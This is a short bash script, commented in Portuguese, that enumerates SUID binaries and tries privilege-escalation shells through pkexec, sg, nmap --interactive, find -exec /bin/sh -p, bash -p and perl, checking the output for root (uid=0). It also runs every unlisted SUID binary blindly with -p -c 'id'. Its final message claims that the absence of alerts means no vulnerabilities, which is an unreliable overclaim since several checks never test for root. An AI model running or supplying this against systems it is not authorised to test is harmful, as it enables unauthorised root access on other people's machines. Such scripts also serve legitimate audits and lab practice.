#!/bin/bash

#Executar como usuário comum
#Testa possíveis escaladas via binários SUID

echo "[+] Buscando arquivos SUID no sistema..."

mapfile -t suid_bins < <(find /usr /bin /sbin /lib /lib64 -perm -4000 -type f 2>/dev/null)

echo -e "\n[+] Testando binários conhecidos para escalada...\n"

for bin in "${suid_bins[@]}"; do
    name=$(basename "$bin")
    case "$name" in
        ksu)
            echo "[*] Testando $bin com ksu -q -e /bin/sh (timeout 3s)..."
            timeout 3 "$bin" -q -e /bin/sh -c 'id' &>/tmp/ksu.out
            if grep -q "uid=0" /tmp/ksu.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        su)
            echo "[*] Testando $bin para su -c id (timeout 3s)..."
            timeout 3 "$bin" -c 'id' &>/tmp/su.out
            if grep -q "uid=0" /tmp/su.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        sudo)
            echo "[*] Testando $bin para sudo -l (timeout 3s)..."
            timeout 3 "$bin" -l &>/tmp/sudo.out
            ;;
        mount)
            echo "[*] Testando $bin com mount --fake-option (timeout 3s)..."
            timeout 3 "$bin" --fake-option &>/tmp/mount.out
            ;;
        pkexec)
            echo "[*] Testando $bin para pkexec /bin/sh (timeout 3s)..."
            timeout 3 "$bin" /bin/sh -c 'id' &>/tmp/pkexec.out
            if grep -q "uid=0" /tmp/pkexec.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        sg)
            echo "[*] Testando $bin com sg root -c id (timeout 3s)..."
            timeout 3 "$bin" root -c 'id' &>/tmp/sg.out
            if grep -q "uid=0" /tmp/sg.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        crontab)
            echo "[*] Testando $bin para listar crontab (timeout 3s)..."
            timeout 3 "$bin" -l &>/tmp/crontab.out
            ;;
        nmap)
            echo "[*] Testando $bin com nmap interactive shell..."
            echo "id" | timeout 3 "$bin" --interactive &>/tmp/nmap.out
            if grep -q "uid=0" /tmp/nmap.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        find)
            echo "[*] Testando $bin para execução SUID..."
            timeout 3 "$bin" . -exec /bin/sh -p \; &>/tmp/find.out
            if grep -q "uid=0" /tmp/find.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        bash)
            echo "[*] Testando $bin - bash -p"
            timeout 3 "$bin" -p -c 'id' &>/tmp/bash.out
            if grep -q "uid=0" /tmp/bash.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        perl)
            echo "[*] Testando $bin com perl -e"
            timeout 3 "$bin" -e 'exec "/bin/sh";' &>/tmp/perl.out
            if grep -q "uid=0" /tmp/perl.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
        *)
            timeout 3 "$bin" -p -c 'id' &>/tmp/gen.out
            if grep -q "uid=0" /tmp/gen.out; then
                echo "[!] POSSÍVEL ESCALADA com $bin"
            fi
            ;;
    esac
done

echo -e "\n[+] Fim do teste. Se não apareceram alertas, não há vulnerabilidades!"
